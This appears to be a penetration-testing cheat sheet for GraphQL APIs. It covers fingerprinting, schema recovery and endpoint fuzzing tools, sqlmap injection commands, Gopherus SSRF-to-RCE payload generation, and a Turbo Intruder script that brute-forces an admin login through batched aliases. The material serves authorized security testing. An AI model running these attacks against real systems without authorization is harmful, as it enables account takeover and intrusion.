# GraphQL Security Tools

---

## graphw00f — Engine Fingerprinting

Detects 30+ GraphQL server implementations from response headers, errors, and behavior.

```bash
pip install graphw00f
graphw00f -d -t https://target.com/graphql
graphw00f -d -t https://target.com/graphql -H "Authorization: Bearer TOKEN"
```

Detects: Apollo, Hasura, Graphene, graphql-go, Sangria, HotChocolate, Lighthouse, and more.

---

## InQL — Burp Suite Extension

Best-in-class Burp extension for GraphQL. Dumps schema, generates introspection queries, runs scans.

**Install:** Burp Suite → Extensions → BApp Store → InQL

**Features:**
- Auto-detect GraphQL endpoints in traffic
- Full introspection dump
- Generate query/mutation templates for manual testing
- Built-in scanner for injection, authorization issues
- Visual schema browser

**CLI mode:**
```bash
pip install inql
inql -t https://target.com/graphql --generate-cycles
inql -t https://target.com/graphql --header "Authorization: Bearer TOKEN"
```

---

## Clairvoyance — Schema Recovery (Introspection Disabled)

Reconstructs the GraphQL schema from field suggestion error messages by fuzzing field names.

```bash
pip install clairvoyance
clairvoyance -u https://target.com/graphql -o recovered_schema.json
clairvoyance -u https://target.com/graphql \
  -H "Authorization: Bearer TOKEN" \
  -w /wordlists/graphql-fields.txt \
  -o recovered_schema.json
```

**Wordlists to use:**
- `/usr/share/wordlists/graphql-fields.txt` (community list)
- `SecLists/Discovery/Web-Content/graphql.txt`

---

## graphql-cop — Automated Security Checks

Runs 15+ automated security checks: introspection, batching, depth limits, field suggestions, aliases.

```bash
pip install graphql-cop
graphql-cop -t https://target.com/graphql
graphql-cop -t https://target.com/graphql -H "Authorization: Bearer TOKEN" -o json
```

**Checks included:**
- Introspection enabled
- GraphQL Playground / GraphiQL exposed
- Field suggestions enabled
- Query batching enabled
- Alias overloading
- Query depth limit
- Circular fragment protection
- GET-based mutations allowed
- Introspection via POST vs GET

---

## Altair GraphQL Client

Full-featured cross-platform GraphQL client with auth, introspection, subscriptions, and collections.

- Desktop app: https://altairgraphql.dev/
- Browser extension: Chrome, Firefox
- Use for: manual query crafting, subscription testing, schema exploration

**Key features:**
- Cookie, bearer, basic auth support
- WebSocket subscription support
- Import/export query collections
- Schema explorer from introspection

---

## GraphQL Voyager — Schema Visualizer

Renders an interactive graph of the GraphQL schema. Useful for spotting relationships, admin types, and hidden paths.

```bash
# Use with a schema JSON from introspection
# Upload to: https://graphql-voyager.com/ (local or self-hosted)
# Or run locally:
npx graphql-voyager-server --schema schema.json
```

---

## wscat — WebSocket Testing

Test GraphQL subscriptions over WebSocket from the command line.

```bash
npm install -g wscat
wscat -c wss://target.com/graphql --subprotocol graphql-ws

# Then send messages interactively:
> {"type":"connection_init","payload":{}}
> {"id":"1","type":"subscribe","payload":{"query":"subscription { messageReceived(userId: 1) { id content } }"}}
```

---

## SQLMap — SQL Injection via GraphQL

```bash
# POST body injection
sqlmap -u "https://target.com/graphql" \
  --data='{"query":"{ user(id: \"*\") { id name } }"}' \
  --dbms=mysql \
  --level=5 --risk=3 \
  --headers="Authorization: Bearer TOKEN\nContent-Type: application/json"

# Using a saved request file (capture from Burp)
sqlmap -r graphql_request.txt --dbms=postgresql
```

---

## Gopherus — SSRF → Protocol Injection

Generate Gopher-based payloads for SSRF → Redis/MySQL/SMTP/FastCGI RCE.

```bash
pip install gopherus
gopherus --exploit redis
gopherus --exploit mysql
gopherus --exploit smtp
```

---

## ffuf — Endpoint Discovery

```bash
# Discover GraphQL endpoints
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/graphql-endpoints.txt \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}' \
  -mc 200,400 \
  -o endpoints.json -of json

# Also try GET-based
ffuf -u https://target.com/FUZZ?query={__typename} \
  -w /usr/share/seclists/Discovery/Web-Content/graphql-endpoints.txt \
  -mc 200,400
```

---

## Burp Suite — Intercepting GraphQL

**Tips for GraphQL in Burp:**
1. Turn on "Show only in-scope items" — GraphQL traffic is easy to lose in noise
2. Right-click a GraphQL request → "Send to Repeater" — craft queries manually
3. Burp's built-in "GraphQL" tab (v2023+) pretty-prints queries
4. Use InQL extension for schema-aware attack generation
5. Use Turbo Intruder for alias-based brute-force (custom batch payloads)

**Turbo Intruder script for alias brute-force:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1)
    passwords = open('/path/to/passwords.txt').read().splitlines()
    batch_size = 50
    for i in range(0, len(passwords), batch_size):
        chunk = passwords[i:i+batch_size]
        aliases = "\n".join(f'  a{j}: login(email: "admin@target.com", password: "{p}") {{ token }}' for j, p in enumerate(chunk))
        query = '{"query":"{\n' + aliases.replace('"', '\\"') + '\n}"}'
        engine.queue(target.req, query, gate='batch')
    engine.openGate('batch')

def handleResponse(req, interesting):
    if 'token' in req.response:
        table.add(req)
```

---

## Recommended Wordlists

| Wordlist | Source | Use For |
|---|---|---|
| `graphql-endpoints.txt` | SecLists | Endpoint discovery |
| `graphql-fields.txt` | Community / clairvoyance | Field suggestion enumeration |
| `mutations.txt` | Custom | Mutation name fuzzing |
| `top10k-passwords.txt` | SecLists | Batch brute-force |

---

## Quick Reference: HTTP Requests

### Introspection (curl)
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query":"{ __schema { types { name kind } } }"}' \
  | python3 -m json.tool
```

### Batch Test (curl)
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ __typename }"},{"query":"{ __typename }"}]'
```

### GET Mutation Test (curl)
```bash
curl -sG https://target.com/graphql \
  --data-urlencode 'query=mutation { __typename }' \
  -H "Cookie: session=YOUR_SESSION"
```

### WebSocket Subscription (wscat)
```bash
wscat -c wss://target.com/graphql --subprotocol graphql-ws \
  -x '{"type":"connection_init","payload":{"Authorization":"Bearer TOKEN"}}'
```
